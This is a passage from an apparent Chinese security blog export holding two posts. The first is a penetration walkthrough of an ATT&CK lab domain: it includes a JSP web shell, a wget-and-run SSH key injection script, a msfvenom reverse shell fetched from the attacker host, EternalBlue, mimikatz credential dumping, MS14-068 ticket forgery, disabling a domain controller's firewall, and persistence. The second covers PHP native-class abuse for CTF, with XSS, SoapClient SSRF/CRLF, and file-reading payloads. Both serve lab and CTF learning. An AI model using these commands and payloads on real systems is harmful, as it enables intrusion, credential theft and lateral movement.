zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-HK;q=0.6\nCookie: JSESSIONID=ks679custfpe6kzo4fkgc7bu; phpMyAdmin=4ac7b41bd0fe91b11cbe6f602f021a0a; pma_lang=zh_CN; auto_saved_sql_sort=\nConnection: close\nContent-Length: 752\n\n&lt;%@ page import=\"java.util.*,java.io.*,java.net.*\"%>\n &lt;%\n %>\n &lt;HTML>&lt;BODY>\n &lt;FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">\n &lt;INPUT TYPE=\"text\" NAME=\"cmd\">\n &lt;INPUT TYPE=\"submit\" VALUE=\"Send\">\n &lt;/FORM>\n &lt;pre>\n &lt;%\n if (request.getParameter(\"cmd\") != null) &#123;\n         out.println(\"Command: \" + request.getParameter(\"cmd\") + \"\\n&lt;BR>\");\n         Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\n         OutputStream os = p.getOutputStream();\n         InputStream in = p.getInputStream();\n         DataInputStream dis = new DataInputStream(in);\n         String disr = dis.readLine();\n         while ( disr != null ) &#123;\n                 out.println(disr); disr = dis.readLine(); &#125;\n         &#125;\n %>\n &lt;/pre>\n &lt;/BODY>&lt;/HTML>\n\n\n访问木马文件，接下来执行刚刚的指令\n\n\n成功写入\n接下来在kali处生成密钥\nsh-keygen -f qwq  (我这里输入的密码是Qq123456)\nchmod 600 qwq\n\n\n\n\n现在相当于我们可以通过操纵qwq目录，来操纵宿主机的目录，需要将这个秘钥传到宿主机就能ssh登录\n接下来查看用户的隐藏文件\nls -alh /qwq/home/ubuntu\n\n\n发现ssh，接下来查看kali生成的pub，写一个脚本进行密钥的写入\ncat qwq.pub                                                                                                     #ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzoCdvHtvS1a+14tG+CWt490iwHKIFDnl4LB1PY0S/vPhs0N2NRg0xkhhba29rIZO4r0wrV2R/0voaYmICLNlx1cBkyHO0ik2GW5WGVzUFYtCKqy6LbSqJ2RH+pS8IJW0Ce2Cf57KFIAozBUFdoLqEQs7TJJPAMw839MGNEZApnqkFcaRbVvwYb0BHuRAuUS3rXpTt9y7tQJ74V5kg5a4dQ+BfO3Nxa3gSwbqA2p+3O4FWrw4w07KKzmix5TT2CSSOvcDGWEMg09ByLd1QcGzfga9eVief76hZvUmoE8wjj5M2y7nJ6cut8eQNguebsegcBmXLemtRM22CI89EUmsmkYkgsOOJjaZc5IQKu/BsqW39B4w8nukxpX14ljD6TcxifHe2+iDPuhSGw3cP7qxNQd4/Sus27JWOLrPdlycP/9sTCEqp3yj7znSXWK4Fo5EoFOoKkntPTsYqH/7x6DRA14OOWPG8oRZkU+EWiKOsLbr5sYscAKCwmebFT8heZm0= root@kali\n\n\n接下来写脚本\nvim key.sh\n    \ncp -avx /qwq/home/ubuntu/.ssh/id_rsa.pub /qwq/home/ubuntu/.ssh/authorized_keys\necho 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzoCdvHtvS1a+14tG+CWt490iwHKIFDnl4LB1PY0S/vPhs0N2NRg0xkhhba29rIZO4r0wrV2R/0voaYmICLNlx1cBkyHO0ik2GW5WGVzUFYtCKqy6LbSqJ2RH+pS8IJW0Ce2Cf57KFIAozBUFdoLqEQs7TJJPAMw839MGNEZApnqkFcaRbVvwYb0BHuRAuUS3rXpTt9y7tQJ74V5kg5a4dQ+BfO3Nxa3gSwbqA2p+3O4FWrw4w07KKzmix5TT2CSSOvcDGWEMg09ByLd1QcGzfga9eVief76hZvUmoE8wjj5M2y7nJ6cut8eQNguebsegcBmXLemtRM22CI89EUmsmkYkgsOOJjaZc5IQKu/BsqW39B4w8nukxpX14ljD6TcxifHe2+iDPuhSGw3cP7qxNQd4/Sus27JWOLrPdlycP/9sTCEqp3yj7znSXWK4Fo5EoFOoKkntPTsYqH/7x6DRA14OOWPG8oRZkU+EWiKOsLbr5sYscAKCwmebFT8heZm0= root@kali' > /qwq/home/ubuntu/.ssh/authorized_keys\n\n而后开启http服务，使得靶机可以访问到该脚本文件\npython -m SimpleHTTPServer 80\n\n在木马文件处执行如下命令\nwget http://192.168.1.129/key.sh\nchmod 777 key.sh\n./key.sh\nls -alh /qwq/home/ubuntu/.ssh\n\n\n接下来按理说就写入成功了\ncat /qwq/home/ubuntu/.ssh/authorized_keys\n\n这个应该可以看到密钥，但我这里并未看到，看一些大师傅给出的原因是密钥设置的过于简短，我刚刚设置的是qwq，小于六位且没大小写，好像是因为这个原因导致的写入密钥失败，但又测试一次过后(设置密码为Qq123456)，仍未看到内容，不知道是啥情况。\n然后正常的话，接下来执行\nssh -i qwq ubuntu@192.168.1.130 \n\n输入我们刚刚设定的密码，就可以实现登录，我这里未复现成功，直接用Ubuntu登录了。\n内网信息搜集ifconfig查看网段\n\n两张网卡，192.168.1.139是外网，那么192.168.183.128应该是内网\nmsf上线接下来同之前docker容器Getshell后msf上线的方法，再对Ubuntu进行一次。首先生成msf木马\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.129 LPORT=7777 -f elf >shell.elf\n\n接下来开启http服务，在Ubuntu处用wegt下载木马文件\npython -m SimpleHTTPServer 80\n\n\n\n\nwget http://192.168.1.129/shell.elf\n\n\n\n\n接下来在kali机上开启监听\nmsfconsole\nuse exploit/multi/handler\nset lhost 192.168.1.129\nset lport 7777\nset payload linux/x86/meterpreter/reverse_tcp\nrun\n\n然后回到Ubuntu，赋予木马文件执行权限并执行\nchmod +x shell.elf\n./shell.elf\n\n\n接下来查看监听处\n\nmsf成功上线\n顺带探测一下内网机器\nuse auxiliary/scanner/discovery/udp_probe\nset RHOSTS 192.168.183.0/24\nset THREADS 5\nrun\n\n\n探测出两台内网机器\n192.168.183.130\n192.168.183.129\n\n\n\n添加路由run autoroute -s 192.168.183.0/24 //添加路由\nrun autoroute -p //检查是否添加成功\n\n\n\n\n设置代理利用earthworm建立代理，首先在kali上执行\n./ew_for_linux64 -s rcsocks -l 1080 -e 1234  \n\n\n然后用python服务的方式，将ew_for_linux64上传至Ubuntu，而后执行\nchmod +x ew_for_linux64\n./ew_for_linux64 -s rssocks -d 192.168.1.129 -e 1234\n\n\n接下来ping内网看是否成功\nping 192.168.183.130\n\n\n代理设置成功！\n横向移动使用nmap对刚刚探测到的两台内网机器进行扫描\nnmap -sS -p 1-65535 -A 192.168.183.129 \n\n\n开放了445端口，尝试永恒之蓝漏洞\nmsf6 auxiliary(scanner/smb/smb_ms17_010) > search MS17-010\n\nMatching Modules\n================\n\n   #  Name                                           Disclosure Date  Rank     Check  Description\n   -  ----                                           ---------------  ----     -----  -----------\n   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\n   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection\n   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+\n   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution\n\n\nInteract with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/smb_doublepulsar_rce\n\nmsf6 auxiliary(scanner/smb/smb_ms17_010) > use 2\n[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/bind_tcp\npayload => windows/x64/meterpreter/bind_tcp\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.183.129\nRHOSTS => 192.168.183.129\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > run\n\n\n\n\n而后就是对域成员的一系列信息搜集\nipconfig /all   # 查看本机ip，所在域\nroute print     # 打印路由信息\nnet view        # 查看局域网内其他主机名\narp -a          # 查看arp缓存\nnet start       # 查看开启了哪些服务\nnet share       # 查看开启了哪些共享\nnet share ipc$  # 开启ipc共享\nnet share c$    # 开启c盘共享\nnet use \\\\192.168.xx.xx\\ipc$ \"\" /user:\"\"    # 与192.168.xx.xx建立空连接\nnet use \\\\192.168.xx.xx\\c$ \"密码\" /user:\"用户名\"    # 建立c盘共享\ndir \\\\192.168.xx.xx\\c$\\user    # 查看192.168.xx.xx c盘user目录下的文件\n\nnet config Workstation    # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域\nnet user                 # 查看本机用户列表\nnet user /domain         # 查看域用户\nnet localgroup administrators    # 查看本地管理员组（通常会有域用户）\nnet view /domain         # 查看有几个域\nnet user 用户名 /domain   # 获取指定域用户的信息\nnet group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）\nnet group 组名 /domain    # 查看域中某工作组\nnet time /domain           // 主域服务器会同时作为时间服务器\nnet group \"domain admins\" /domain  # 查看域管理员的名字\nnet group \"domain computers\" /domain  # 查看域中的其他主机名\nnet group \"doamin controllers\" /domain  # 查看域控制器（可能有多台）\nnet group \"Enterprise Admins\" /domain    // 查看域管理员组\n\n\n\n接下来加载kiwi，并抓取用户凭据\n#msf6中mimikatz已经不可以用了，mimikatz模块已经合并为kiwi模块\nload kiwi #加载kiwi模块\ncreds_all #列举所有凭据\n\n\n\n\n\n\n接下来去执行mimikatz.exe抓取域控密码\nprivilege::debug\nsekurlsa::logonpasswords\n\n有密码后，尝试Ms14-068\nhttps://github.com/abatchy17/WindowsExploits/tree/master/MS14-068\n\n而后通过msf上传到win7upload /tools/Ms14-068.exe C://users/douser\n接下来利用它来伪造票据\nMS14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码\n\nMS14-068.exe -u douser@DEMO.COM -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123\n\n\n\n接下来将生成的&#x54;&#71;&#84;&#x5f;&#x64;&#111;&#x75;&#115;&#101;&#x72;&#x40;&#100;&#101;&#109;&#111;&#46;&#x63;&#x6f;&#109;&#x2e;&#99;&#x63;&#x61;&#x63;&#104;&#101;移到mimikatz目录下\ncopy TGT_douser@demo.com.ccache /users/douser/desktop\n\n然后mimikatz注入票据\nkerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造\nkerberos::list          //查看当前机器凭证\nkerberos::ptc &lt;生成的票据文件>   //将票据注入到内存中\n\n\n这里的话就是kerberos::ptc &#x54;&#71;&#x54;&#95;&#x64;&#111;&#117;&#x73;&#101;&#x72;&#x40;&#100;&#101;&#109;&#111;&#x2e;&#x63;&#111;&#x6d;&#46;&#99;&#x63;&#x61;&#99;&#x68;&#x65;\n接下来我们就成功的获取了域控权限，然后我们接下来只将一个msf木马上传至域控，关闭防火墙并执行木马文件即可实现msf上线\nnet use \\\\WIN-ENS2VR5TR3N\\c$  //控制域成员与域控建立一个ipc链接\n\nmsf生成正向连接木马\nmsfvenom -p windows/x64/meterpreter/bind_tcp LHOST=192.168.183.130 LPORT=7777 -f exe > shell.exe\n\n将shell.exe上传至Win7，然后上传至域控\ncopy shell.exe \\\\WIN-ENS2VR5TR3N\\c$\n\n利用Sc关闭防火墙，并执行木马文件\nsc \\\\WIN-ENS2VR5TR3N create ProFirewall binpath= \"netsh advfirewall set allprofiles state off\" \nsc \\\\WIN-ENS2VR5TR3N start ProFirewall \nsc \\\\WIN-ENS2VR5TR3N create Startup binpath= \"C:\\shell.exe\" \nsc \\\\WIN-ENS2VR5TR3N start Startup\n\n同时msf进行监听（监听一定在木马执行之前）\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/bind_tcp\nset RHOST 192.168.183.130\nset LPORT 7777\nexploit\n\n而后成功上线，接管域控\n接下来执行\nrun persistence -X -i 5 -p 4000 -P windows/meterpreter/bind_tcp\n\n而后上传mimikatz.exe,抓取密码\n得到密码后，开启3389（远程桌面登录服务）\nrun post/windows/manage/enable_rdp\n\n账密如下\nDEMO\\administrator\n!QAZ2wsx\n\n而后成功登录，即可实现远控域控\nRefererhttps://blog.csdn.net/zy15667076526/article/details/116059592\nhttps://www.freebuf.com/articles/web/340783.html\nhttps://cloud.tencent.com/developer/article/2236315\nhttps://www.viewofthai.link/2022/08/29/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95%EF%BC%88%E4%B8%8A%EF%BC%89/\n","slug":"内网靶场实战——ATT&CK实战系列（四）","date":"2023-04-11T17:32:20.000Z","categories_index":"内网","tags_index":"内网","author_index":"quan9i"},{"id":"66ce77a9cc55d19533b30410eadbc5d9","title":"PHP 常见内置类浅析","content":"前言周末看题，遇PHP原生类，坐牢，此前未学，故学，浅结，如下。\nPHP原生类基础概念什么是原生类呢，接下来来简单介绍一下它。\nPHP原生类就是在标准PHP库中已经封装好的类，而在其中，有些类具有一些功能，例如文件读取、目录遍历等，这就给了我们可乘之机，我们只需要实例化这些类，就可以实现文件读取这种敏感操作。\n在CTF中，有时会遇到一些奇怪的题，比如没有给出反序列化的类，这个时候可能就需要用到PHP原生类了\n我们可以通过如下脚本来获取调用了常见魔术方法的原生类\n&lt;?php\n$classes = get_declared_classes();\nforeach ($classes as $class) &#123;\n    $methods = get_class_methods($class);\n    foreach ($methods as $method) &#123;\n        if (in_array($method, array(\n            '__destruct',\n            '__toString',\n            '__wakeup',\n            '__call',\n            '__callStatic',\n            '__get',\n            '__set',\n            '__isset',\n            '__unset',\n            '__invoke',\n            '__set_state'    // 如果题目中有其他的魔术方法，可自行添加进来, 来遍历存在指定方法的原生类\n        ))) &#123;\n            print $class . '::' . $method . \"\\n\";\n        &#125;\n    &#125;\n&#125; \n\n其输出结果如下\nException::__wakeup\nException::__toString\nErrorException::__wakeup\nErrorException::__toString\nError::__wakeup\nError::__toString\nParseError::__wakeup\nParseError::__toString\nTypeError::__wakeup\nTypeError::__toString\nArgumentCountError::__wakeup\nArgumentCountError::__toString\nArithmeticError::__wakeup\nArithmeticError::__toString\nDivisionByZeroError::__wakeup\nDivisionByZeroError::__toString\nGenerator::__wakeup\nClosedGeneratorException::__wakeup\nClosedGeneratorException::__toString\n...\n\n\n\n常用的有以下几个\nError\nException\nSoapClient\nDirectoryIterator\nSimpleXMLElement\nSplFileObject\n\n接下来对其进行简单讲解\nXSS By Error/ExceptionError前提适用于php7版本\n在开启报错的情况下\n原理Error 是所有PHP内部错误类的基类，用于自动自定义一个Error，该类是在PHP 7.0.0 中开始引入的（此即前提条件一之原因）。\nError类中含有一个__tostring魔术方法，如果把它当做字符串使用，就会触发该魔术方法。例如我们对其进行输出操作(echo)，此时就会自动调用__tostring魔术方法，如果Error类中内容为XSS恶意语句，此时就会导致XSS\ndemo现有题目如下\n&lt;?php\n$a = unserialize($_GET['a']);\necho $a;\n?> \n\n对代码进行简单分析，这里对传入的a参数直接进行反序列化而后进行了输出操作。这明显是一个PHP反序列化的问题，但却没给出反序列化的类，此时就要考虑用PHP原生类了。\n构造Poc如下\n&lt;?php\n$a = new Error(\"&lt;script>alert('xss')&lt;/script>\");\necho urlencode(serialize($a));  \n#O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A39%3A%22D%3A%5CphpStudy%5CPHPTutorial%5CWWW%5Chtml%5Cqq.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D\n?>\n\n接下来访问构造好的题目环境，将构造好的Payload赋值给a参数。\n\n成功触发XSS\nException前提适用于php5、7版本\n开启报错的情况下\n原理Exception是所有用户级异常的基类，它触发XSS的原理与Error类似，类中也存在一个__tostring魔术方法，当其被触发且类中存在恶意代码时，此时就会出现XSS。\ndemo题目同上\n&lt;?php\n$a = unserialize($_GET['a']);\necho $a;\n?> \n\nPoc如下\n&lt;?php\n$a = new Exception(\"&lt;script>alert('xss')&lt;/script>\");\necho urlencode(serialize($a));  \n#O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A40%3A%22D%3A%5CphpStudy%5CPHPTutorial%5CWWW%5Chtml%5C877.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D\n?>\n\n\n成功触发XSS\nSSRF By SoapClient首先来简单介绍一下SoapClient 类\n定义首先看看SOAP的介绍\nSOAP，作为webService三要素(SOAP、WSDL、UDDI)之一，用来描述传递信息的格式，SOAP可以和现存的许多因特网协议和格式结合使用，包括超文本传输协议（HTTP），简单邮件传输协议（SMTP），多用途网际邮件扩充协议（MIME）。它还支持从消息系统到远程过程调用（RPC）等大量的应用程序。SOAP使用基于XML的数据结构和超文本传输协议(HTTP)的组合定义了一个标准的方法来使用Internet上各种不同操作环境中的分布式对象。(以上来自百度百科)\n\n简单的说，就是这个SOAP可以发送请求，当我们能够控制数据包中的内容时，就可以通过GET/POST方法进行传参，进而发起SSRF。\n注：如果想要使用SoapClient类需要在php.ini配置文件里面开启extension=php_soap.dll选项\n接下来来看一下PHP SoapClient类的部分内容\nSoapClient &#123;\n    /* 方法 */\n    public __construct ( string|null $wsdl , array $options = [] )\n    public __call ( string $name , array $args ) : mixed\n    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null\n    public __getCookies ( ) : array\n    public __getFunctions ( ) : array|null\n    public __getLastRequest ( ) : string|null\n    public __getLastRequestHeaders ( ) : string|null\n    public __getLastResponse ( ) : string|null\n    public __getLastResponseHeaders ( ) : string|null\n    public __getTypes ( ) : array|null\n    public __setCookie ( string $name , string|null $value = null ) : void\n    public __setLocation ( string $location = \"\" ) : string|null\n    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool\n    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed\n&#125;\n\n可以看出这里存在一个__call方法，而正是由于这个魔术方法，导致了SSRF的出现。当__call魔术方法被调用时，它就会向目标URL发送一个soap请求，也可以理解为HTTP/HTTPS请求。\n接下来看一下该函数的参数\npublic __construct ( string|null $wsdl , array $options = [] )\n\n从这里可以看出需要两个参数，第一个参数$wsdl用来指明是否为wsdl模式，这个一般不开，也用不到，所以不进行讲解，有兴趣的师傅可自行参考https://www.cnblogs.com/hujun1992/p/wsdl.html。接下来看第二个参数，如果是`wsdl`模式，则它是可选项(可写可不写)，若不是`wsdl`模式，则第二个参数必须写，且数组中必须要设置`location`和`uri`选项，其中`location`是目标URL，而`uri`是`SOAP`服务的目标命名空间\ndemo既然此类可发送请求，且URL可控，那我们监听本机一个端口，同时发起一个请求，看看会有什么反应。\n首先在VPS开启监听\n\n接下来我们去请求这个端口，看看有何响应\n&lt;?php \n$a = new SoapClient(null,array('uri'=>'quan9i', 'location'=>'http://ip:7777')); \n$b = serialize($a); \n$c = unserialize($b); \n$c -> abc();\n\n接下来运行php文件，在VPS上收到响应\n\n从这里可以看到**SOAPAction: “quan9i#abc”**，quan9i是我们写入的uri，abc则是我们调用的方法名，因此如果HTTP头部还存在CRLF漏洞(即插入\\r\\n)的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头或是POST报文。接下来实验一下\n插入Cookie\n&lt;?php \n$a = new SoapClient(null,array('location' => 'http://VPS:7777', 'user_agent' => \"quan9i\\r\\nCookie: PHPSESSID=abcdefghijklmn\", 'uri' => 'qwq'));\n$b = serialize($a); \n$c = unserialize($b); \n$c -> abc();\n\n\n插入POST报文\n&lt;?php \n$a = new SoapClient(null,array('location' => 'http://VPS:7777', 'user_agent' => \"quan9i\\r\\n\\r\\nPOSTtest\", 'uri' => 'qwq'));\n$b = serialize($a); \n$c = unserialize($b); \n$c -> abc();\n\n\n此时还有一个问题就是传输POST数据时需遵循HTTP协议，所以 Content-Type 的值我们要设置为 application/x-www-form-urlencoded，Content-type的值在User-Agent下方，所以我们可以通过 SoapClient 来设置 User-Agent，构造代码如下\n&lt;?php\n$target = 'http://VPS:7777';\n$post_data = 'qwq=1';\n$headers = array('X-Forwarded-For: 127.0.0.1');\n$a = new SoapClient(null,array('location' => $target,'user_agent'=>'qwq^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_data).'^^^^'.$post_data,'uri'=>'test'));\n$b = serialize($a);\n$b = str_replace('^^',\"\\n\\r\",$b);\necho $b;\n$c = unserialize($b);\n$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf\n?>\n\n运行文件\n\n可以看出成功挤掉了原来的Content-type，我们成功上传了一个新的Content-type\n文件读取SplFileObject定义plFileObject 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。该类部分代码如下\nclass SplFileObject extends SplFileInfo implements RecursiveIterator, SeekableIterator &#123;\n/* 常量 */\npublic const int DROP_NEW_LINE;\npublic const int READ_AHEAD;\npublic const int SKIP_EMPTY;\npublic const int READ_CSV;\n/* 方法 */\npublic __construct(\n    string $filename,\n    string $mode = \"r\",\n    bool $useIncludePath = false,\n    ?resource $context = null\n)\npublic current(): string|array|false\npublic eof(): bool\npublic fflush(): bool\npublic fgetc(): string|false\npublic fgetcsv(string $separator = \",\", string $enclosure = \"\\\"\", string $escape = \"\\\\\"): array|false\npublic fgets(): string\npublic fgetss(string $allowable_tags = ?): string\npublic flock(int $operation, int &amp;$wouldBlock = null): bool\npublic fpassthru(): int\npublic fputcsv(\n    array $fields,\n    string $separator = \",\",\n    string $enclosure = \"\\\"\",\n    string $escape = \"\\\\\",\n    string $eol = \"\\n\"\n): int|false\n...\n/* 继承的方法 */\npublic SplFileInfo::__toString(): string\n&#125;\n\n\n\n原理该类的构造方法可以构造一个新的文件对象用于后续的读取。其大致原理可简单解释一下，当类中__tostring魔术方法被触发时，如果类中内容为存在文件名，那么它会对此文件名进行内容获取。\n简单利用读取文件方法如下\n&lt;?php\n$context = new SplFileObject('/etc/passwd');\necho $context;\n\n\n成功读取文件，但从中可看出，这样的话只能读取一行，因此如果我们想读取多行的话，需要进行一个遍历输出，具体代码如下\n&lt;?php\nhighlight_file(__FILE__); \n$dir = new SplFileObject('/etc/passwd'); \nforeach($dir as $key)&#123;\n    echo($key);\n&#125;\n\n\n遍历目录FilesystemIterator定义DirectoryIterator 类可以理解为文件系统迭代器，其构造方法将会创建一个指定目录的迭代器\n该类的部分代码如下\n class FilesystemIterator extends DirectoryIterator &#123;\n/* Methods */\npublic __construct(string $directory, int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO | FilesystemIterator::SKIP_DOTS)\npublic current(): string|SplFileInfo|FilesystemIterator\npublic getFlags(): int\npublic key(): string\npublic next(): void\npublic rewind(): void\npublic setFlags(int $flags): void\n/* Inherited methods */\npublic DirectoryIterator::current(): mixed\npublic DirectoryIterator::getBasename(string $suffix = \"\"): string\npublic DirectoryIterator::getExtension(): string\npublic DirectoryIterator::getFilename(): string\npublic DirectoryIterator::isDot(): bool\npublic DirectoryIterator::key(): mixed\npublic DirectoryIterator::next(): void\npublic DirectoryIterator::rewind(): void\npublic DirectoryIterator::seek(int $offset): void\npublic DirectoryIterator::__toString(): string\npublic DirectoryIterator::valid(): bool\n...\npublic SplFileInfo::setFileClass(string $class = SplFileObject::class): void\npublic SplFileInfo::setInfoClass(string $class = SplFileInfo::class): void\npublic SplFileInfo::__toString(): string\n&#125;\n\n原理此类内置了__tostring函数，当我们用了这个类，且对其进行echo或其他操作时，会触发__tostring函数，此时会返回这个迭代器的第一项，亦即返回文件名。\n简单利用直接利用函数并输出的话它只能输出一个文件名，因此需要一个遍历函数，这样才能获取指定目录的全部文件名。\n&lt;?php\nhighlight_file(__FILE__);\n$dir=new FilesystemIterator(\"/\");\nforeach($dir as $f)&#123;\n    echo($f.'&lt;br>');\n&#125;\n\n\n成功输出根目录文件名\ndemo现有题目如下(代码参考自http://arsenetang.com)\n&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\necho 'flag就在这个目录下的某个目录中的文件里';\necho '&lt;/br>';\nclass A&#123;\n    public $class;\n    public $para;\n    public function __wakeup()\n    &#123;\n        echo new  $this->class ($this->para);\n    &#125;\n&#125;\nif(isset($_GET['a']))&#123;\n    unserialize($_GET['a']);\n&#125;\n\n对于这个，我们可以看到提示了flag在这个目录下的某个目录中的文件里，明显是想让我们进行目录遍历，同时这里并未给出其他可利用的类，且存在echo函数，因此我们想到PHP原生类中的FilesystemIterator 类。\n因此我们这里可以给$class赋值为目录读取类，给$para赋值为我们想读取的目录，构造Poc如下\n&lt;?php\nclass A&#123;\n    public $class = 'FilesystemIterator';\n    public $para = './';\n&#125;\n$a = new A();\necho serialize($a);\n#O:1:\"A\":2:&#123;s:5:\"class\";s:18:\"FilesystemIterator\";s:4:\"para\";s:2:\"./\";&#125;\n?>\n\n此时用得到的Payload去打，即可发现flag\n\n接下来读取flag文件夹，看看里面有啥\n&lt;?php\nclass A&#123;\n    public $class = 'FilesystemIterator';\n    public $para = './flag';\n&#125;\n$a = new A();\necho serialize($a);\n#O:1:\"A\":2:&#123;s:5:\"class\";s:18:\"FilesystemIterator\";s:4:\"para\";s:6:\"./flag\";&#125;\n?>\n\n\n但它这个类是没有文件读取功能的，想读取文件的话还需要用到其他类，这里使用SplFileObject类进行读取，因此简单修改一下Poc，尝试读取flag.txt\n&lt;?php\nclass A&#123;\n    public $class = 'SplFileObject';\n    public $para = './flag/flag.txt';\n&#125;\n$a = new A();\necho serialize($a);\n#O:1:\"A\":2:&#123;s:5:\"class\";s:13:\"SplFileObject\";s:4:\"para\";s:15:\"./flag/flag.txt\";&#125;\n?>\n\n\n成功获取flag\nDirectoryIterator定义DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。\n该类的部分代码如下\nDirectoryIterator extends SplFileInfo implements SeekableIterator &#123;\n    /* 方法 */\n    public __construct ( string $path )\n    public current ( ) : DirectoryIterator\n    public getATime ( ) : int\n    public getBasename ( string $suffix = ? ) : string\n    public getCTime ( ) : int\n    public getExtension ( ) : string\n    public getFilename ( ) : string\n    public getGroup ( ) : int\n    public getInode ( ) : int\n    public getMTime ( ) : int\n    public getOwner ( ) : int\n    public getPath ( ) : string\n    public getPathname ( ) : string\n    public getPerms ( ) : int\n    public getSize ( ) : int\n    public getType ( ) : string\n    public isDir ( ) : bool\n    public isDot ( ) : bool\n    public isExecutable ( ) : bool\n    public isFile ( ) : bool\n    public isLink ( ) : bool\n    public isReadable ( ) : bool\n    public isWritable ( ) : bool\n    public key ( ) : string\n    public next ( ) : void\n    public rewind ( ) : void\n    public seek ( int $position ) : void\n    public __toString ( ) : string    // 以字符串形式获取文件名\n    public valid ( ) : bool\n&#125;\n\n简单利用如果不进行遍历，它只能获取指定目录下排序后的一个文件名，因此我们需要进行一个遍历才可获取其指定目录下全部文件名，利用方式如下\n&lt;?php\nhighlight_file(__FILE__);\n$dir=new DirectoryIterator(\"/\"); \nforeach($dir as $f)&#123;\n     echo($f.'&lt;br>');\n&#125;\n\n接下来访问环境，即可发现\n\n根目录文件名均被列出。\nGlobIterator定义GlobIterator与前两个类相似，它也可以遍历一个文件目录，略有不同的是它与glob()有共通之处，可以通过模式匹配寻找文件路径，比如题目的flag在aaccflag.php中，我们知道文件名可能会有flag，此时就可以去GlobIterator(/*flag*)这种方式来匹配flag。\n具体代码如下\n&lt;?php\nhighlight_file(__FILE__);\n$dir=new GlobIterator(\"/*flag*\"); \necho $dir;\n\n\n接下来去访问\n成功找到flag文件\nopen_basedir BYpass当这三个目录遍历类与glob伪协议相结合时，可以绕过open_basedir，查看指定目录下的文件名，具体代码如下\n&lt;?php\n$dir = $_GET['cmd'];\n$a = new DirectoryIterator($dir);\nforeach($a as $f)&#123;\n    echo($f.'&lt;br>');\n&#125;\n?>\n\n访问环境\n\n成功输出根目录文件名，其他目录遍历类亦是如此，这里不再演示。\nCTF赛题实战XSS[BJDCTF 2nd]xss之光没找到环境，但无妨，因为很多大师傅已经给出了Wp，附赠了源码，因此直接看思路即可。\n其题目代码如下\n&lt;?php\n$a = $_GET['yds_is_so_beautiful'];\necho unserialize($a);\n\n这里不难看出是有关PHP反序列化的，但并未给出参数，因此联想到PHP原生类的利用，题目名为Xss之光，且最后有echo函数，明显的原生类触发XSS题目，对于XSS，XSS利用window.open()函数，就可打开新窗口，带出Cookie(flag一般都在Cookie中)，因此构造Poc如下\n&lt;?php\n$a = new Exception(\"&lt;script>window.location.href='https://www.baidu.com'&lt;/script>\");\necho 